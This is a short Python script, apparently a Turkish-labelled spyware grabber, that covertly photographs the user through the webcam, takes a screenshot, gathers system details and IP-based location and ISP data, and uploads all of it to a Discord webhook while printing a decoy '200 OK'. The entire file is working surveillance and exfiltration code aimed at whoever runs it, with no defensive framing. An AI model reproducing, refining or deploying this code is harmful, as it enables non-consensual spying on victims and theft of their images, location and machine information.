# --By Manigas--
from discord_webhook import DiscordWebhook
import pyautogui
import pyscreenshot as ImageGrab
import cv2
import platform
import os
import requests
def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

def take_photo():
    camera = cv2.VideoCapture(0)
    return_value, image = camera.read()
    cv2.imwrite('photo.png', image)
    del(camera)

def send_to_discord(webhook_url, screenshot_file="screenshot.png", photo_file="photo.png", pc_info="", ip_info=""):
    screenshot = screenshot_file
    photo = photo_file

    embed = {
        "title": "Kamera ve Ekran Görüntüsü",
        "description": "Bilgisayar Bilgileri:",
        "fields": [
            {"name": "Sistem", "value": pc_info["system"], "inline": True},
            {"name": "Node Adı", "value": pc_info["node"], "inline": True},
            {"name": "Sürüm", "value": pc_info["release"], "inline": True},
            {"name": "Versiyon", "value": pc_info["version"], "inline": True},
            {"name": "Makine", "value": pc_info["machine"], "inline": True},
            {"name": "İşlemci", "value": pc_info["processor"], "inline": True},
            {"name": "IP Adresi", "value": ip_info["ip"], "inline": True},
            {"name": "Konum", "value": f"{ip_info['city']}, {ip_info['region']}, {ip_info['country']}", "inline": True},
            {"name": "ISP", "value": ip_info["org"], "inline": True}
        ]
    }

    webhook = DiscordWebhook(url=webhook_url, content='', embeds=[embed])
    webhook.add_file(file=open(screenshot, "rb"), filename='screenshot.png')
    webhook.add_file(file=open(photo, "rb"), filename='photo.png')
    response = webhook.execute()

def get_pc_info():
    system_info = platform.uname()
    pc_info = {
        "system": system_info.system,
        "node": system_info.node,
        "release": system_info.release,
        "version": system_info.version,
        "machine": system_info.machine,
        "processor": system_info.processor
    }
    return pc_info

def get_ip_info():
    ip_info = requests.get("https://ipinfo.io/json").json()
    return ip_info

if __name__ == "__main__":
    webhook_url = 'WEB_HOOK_URL'
    take_photo()
    take_screenshot()
    pc_info = get_pc_info()
    ip_info = get_ip_info()
    print("200 OK")
    send_to_discord(webhook_url, pc_info=pc_info, ip_info=ip_info)
